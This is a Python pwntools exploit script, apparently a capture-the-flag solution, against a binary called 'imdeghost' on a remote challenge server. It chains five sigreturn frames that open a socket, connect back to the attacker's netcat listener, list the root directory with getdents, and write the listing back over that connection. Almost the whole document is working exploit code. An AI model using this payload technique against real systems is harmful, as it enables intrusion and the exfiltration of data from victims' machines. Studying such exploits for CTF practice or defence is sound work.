#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import ctypes, struct, sys, os, socket

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF('./imdeghost')

host, port = "143.198.127.103", "42007"

# here you put the IP & port of your listener:  nc -l -p PORT
CPORT = 13337
CIP = '127.0.0.1'

def sockaddr():
    family = struct.pack('H', socket.AF_INET)
    portbytes = struct.pack('H', socket.htons(CPORT))
    ipbytes = socket.inet_aton(CIP)
    number = struct.unpack('Q', family + portbytes + ipbytes)
    return ((number[0] + (1 << 64)) % (1 << 64))

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)


gadget0 = 0x000013370000004b # syscall

dir = '/\x00'
length = (len(dir)+7) & 0xfff8
dir = dir.ljust(length,'\x00')
print('length = '+str(length))

frame1 = SigreturnFrame(arch="amd64", kernel="amd64")
frame2 = SigreturnFrame(arch="amd64", kernel="amd64")
frame3 = SigreturnFrame(arch="amd64", kernel="amd64")
frame4 = SigreturnFrame(arch="amd64", kernel="amd64")
frame5 = SigreturnFrame(arch="amd64", kernel="amd64")

#print('len frame = '+str(len(frame)))
# socket(2,1,0)
frame1.rax = 41
frame1.rdi = 2
frame1.rsi = 1
frame1.rdx = 0
frame1.rsp = 0x6900000000+8+0xc0
frame1.r15 = 0x0f
frame1.rip = gadget0

frame1 = bytes(frame1)[0:0xc0]  # each time we reduce frame size, to reduce total payload size

# connect 
sockst = p64(sockaddr())+p64(0)
frame2.rax = 42
frame2.rdi = 0
frame2.rsi = 0x6900000000+8+0xc0+8+0xc0
frame2.rdx = 16
frame2.rsp = 0x6900000000+8+0xc0+8+0xc0+len(sockst)
frame2.r15 = 0x0f
frame2.rip = gadget0

frame2 = bytes(frame2)[0:0xc0]

# open(dir)
frame3.rax = 2
frame3.rdi = 0x6900000000+8+0xc0+8+0xc0+len(sockst)+8+0xc0
frame3.rsi = 0
frame3.rdx = 0
frame3.rsp = 0x6900000000+8+0xc0+8+0xc0+len(sockst)+8+0xc0+len(dir)
frame3.r15 = 0x0f
frame3.rip = gadget0

frame3 = bytes(frame3)[0:0xc0]

#getdents
frame4.rax = 78
frame4.rdi = 1
frame4.rsi = 0x6900000800
frame4.rdx = 0x800
frame4.rsp = 0x6900000000+8+0xc0+8+0xc0+len(sockst)+8+0xc0+len(dir)+8+0xc0
frame4.r15 = 0x0f
frame4.rip = gadget0

frame4 = bytes(frame4)[0:0xc0]

# write
frame5.rax = 1
frame5.rdi = 0
frame5.rsi = 0x6900000800
frame5.rdx = 0x800
frame5.rsp = 0x6900000000+8+0xc0+8+0xc0+len(sockst)+8+0xc0+len(dir)+8+0xc0+8+0xc0
frame5.r15 = 0x0f
frame5.rip = gadget0

frame5 = bytes(frame5)[0:0xc0]

payload = p64(gadget0)+frame1+p64(gadget0)+frame2+sockst+p64(gadget0)+frame3+dir+p64(gadget0)+frame4+p64(gadget0)+frame5

# we use lsb byte of payload length (0xf = 15 = sigreturn), as eax value for the first syscall, the next one will be set by the sigrops
payload = payload.ljust(0x40f,'\x00')

p.sendafter('again.\n',payload)

p.interactive()

